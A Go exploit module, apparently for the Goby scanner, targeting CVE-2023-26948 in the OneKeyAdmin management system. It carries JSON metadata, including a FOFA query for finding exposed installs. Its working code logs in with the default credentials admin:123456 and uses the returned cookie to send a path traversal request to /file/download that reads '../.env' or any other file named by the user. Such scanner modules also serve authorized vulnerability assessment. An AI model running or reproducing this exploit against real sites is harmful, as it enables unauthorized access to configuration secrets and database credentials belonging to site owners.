package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "OneKeyAdmin download routing url parameter background file reading vulnerability (CVE-2023-26948)",
    "Description": "<p>OneKeyAdmin is a plug-in management system based on Thinkphp6 + Element.</p><p>OneKeyAdmin allows a remote attacker to read local sensitive files after logging in to the backend with a default password.</p>",
    "Product": "onekeyadmin",
    "Homepage": "https://www.onekeyadmin.com",
    "DisclosureDate": "2023-02-27",
    "Author": "sunying",
    "FofaQuery": "body=\"OneKeyAdmin\"",
    "GobyQuery": "body=\"OneKeyAdmin\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.onekeyadmin.com\">https://www.onekeyadmin.com</a></p>",
    "References": [
        "https://github.com/keheying/onekeyadmin/issues/5"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filename",
            "type": "input",
            "value": "../.env",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "Default Password",
        "File Read"
    ],
    "VulType": [
        "File Read",
        "Default Password"
    ],
    "CVEIDs": [
        "CVE-2023-26948"
    ],
    "CNNVD": [
        "CNNVD-202303-661"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "OneKeyAdmin 管理系统 download 路由 url 参数后台文件读取漏洞（CVE-2023-26948）",
            "Product": "onekeyadmin",
            "Description": "<p>OneKeyAdmin 是一个基于 Thinkphp6 + Element 的插件化管理系统。<br></p><p>OneKeyAdmin 允许远程攻击者通过默认密码登录 admin:123456 后台后读取本地敏感文件。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.onekeyadmin.com\">https://www.onekeyadmin.com</a></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。\t\t<br></p>",
            "VulType": [
                "默认口令",
                "文件读取"
            ],
            "Tags": [
                "默认口令",
                "文件读取"
            ]
        },
        "EN": {
            "Name": "OneKeyAdmin download routing url parameter background file reading vulnerability (CVE-2023-26948)",
            "Product": "onekeyadmin",
            "Description": "<p>OneKeyAdmin is a plug-in management system based on Thinkphp6 + Element.</p><p>OneKeyAdmin allows a remote attacker to read local sensitive files after logging in to the backend with a default password.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.onekeyadmin.com\">https://www.onekeyadmin.com</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read",
                "Default Password"
            ],
            "Tags": [
                "Default Password",
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10865"
}`

	sendPayloadLoginda8409af := func(u *httpclient.FixUrl, loginAccount, loginPassword string) string {
		cfg := httpclient.NewPostRequestConfig("/filestore/login/index")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/json")
		cfg.Data = `{"loginAccount":"` + loginAccount + `","loginPassword":"` + loginPassword + `","captcha":""}`
		rsp, err := httpclient.DoHttpRequest(u, cfg)
		if err == nil && rsp != nil && strings.Contains(rsp.Utf8Html, "{\"status\":\"success\"") {
			return rsp.Cookie
		} else {
			return ""
		}
	}

	sendPayload793b247c := func(u *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/file/download?url=" + filename + "&title=/")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Cookie", sendPayloadLoginda8409af(u, "admin", "123456"))
		return httpclient.DoHttpRequest(u, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayload793b247c(u, "../.env")
			return err == nil && rsp != nil && rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, "APP_DEBUG")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filename := goutils.B2S(ss.Params["filename"])
			rsp, err := sendPayload793b247c(expResult.HostInfo, filename)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else {
				expResult.Success = true
				expResult.Output = rsp.Utf8Html
			}
			return expResult
		},
	))
}
